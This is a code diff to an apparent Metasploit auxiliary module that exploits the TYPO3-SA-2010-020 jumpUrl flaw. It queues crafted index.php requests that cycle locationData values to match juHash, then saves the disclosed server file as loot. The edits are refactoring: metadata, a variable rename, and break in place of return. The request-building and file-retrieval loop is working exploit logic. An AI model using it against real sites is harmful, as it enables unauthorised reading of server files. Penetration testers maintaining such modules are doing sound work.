@@ -24,7 +24,12 @@ class MetasploitModule < Msf::Auxiliary
         'Chris John Riley',
         'Gregor Kopf', # Original Discovery
       ],
-      'License' => MSF_LICENSE
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -64,8 +69,8 @@ class MetasploitModule < Msf::Auxiliary
 
     1.upto(datastore['MAX_TRIES']) do
       counter += 1
-      locationData = "#{location_base}::#{counter}"
-      queue << "#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=0"
+      location_data = "#{location_base}::#{counter}"
+      queue << "#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{location_data}&juHash=0"
       if ((counter.to_f / datastore['MAX_TRIES'].to_f) * 100.0).to_s =~ /(25|50|75|100).0$/ # Display percentage complete every 25%
         percentage = (counter.to_f / datastore['MAX_TRIES'].to_f) * 100
         print_status("Queue #{percentage.to_i}% compiled - [#{counter} / #{datastore['MAX_TRIES']}]")
@@ -74,6 +79,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('Queue compiled. Beginning requests... grab a coffee!')
 
+    success = false
     counter = 0
     queue.each do |check|
       counter += 1
@@ -87,16 +93,17 @@ class MetasploitModule < Msf::Auxiliary
               'Connection' => 'Close'
             }
         }, 25)
-      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-        return
+      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
+        vprint_error(e.message)
+        break
       rescue ::Timeout::Error, ::Errno::EPIPE => e
         print_error(e.message)
-        return
+        break
       end
 
       if file.nil?
         print_error('Connection timed out')
-        return
+        break
       end
 
       if ((counter.to_f / queue.length.to_f) * 100.0).to_s =~ /\d0.0$/ # Display percentage complete every 10%
@@ -110,23 +117,24 @@ class MetasploitModule < Msf::Auxiliary
         case file.body
         when 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
           print_error("File #{datastore['RFILE']} does not exist.")
-          return
+          break
         when /jumpurl Secure: locationData/i
           print_error("File #{datastore['RFILE']} is not accessible.")
-          return
+          break
         when 'jumpurl Secure: The requested file was not allowed to be accessed through jumpUrl (path or file not allowed)!'
           print_error("File #{datastore['RFILE']} is not allowed to be accessed through jumpUrl.")
-          return
+          break
         end
       when 'application/octet-stream'
+        success = true
         addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
         print_good('Found matching hash')
         print_good('Writing local file ' + File.basename(datastore['RFILE'].downcase) + ' to loot')
         store_loot('typo3_' + File.basename(datastore['RFILE'].downcase), 'text/xml', addr, file.body, 'typo3_' + File.basename(datastore['RFILE'].downcase), 'Typo3_sa_2010_020')
-        return
+        break
       end
     end
 
-    print_error("#{rhost}:#{rport} [Typo3-SA-2010-020] Failed to retrieve file #{datastore['RFILE']}")
+    print_error("#{rhost}:#{rport} [Typo3-SA-2010-020] Failed to retrieve file #{datastore['RFILE']}") unless success
   end
 end
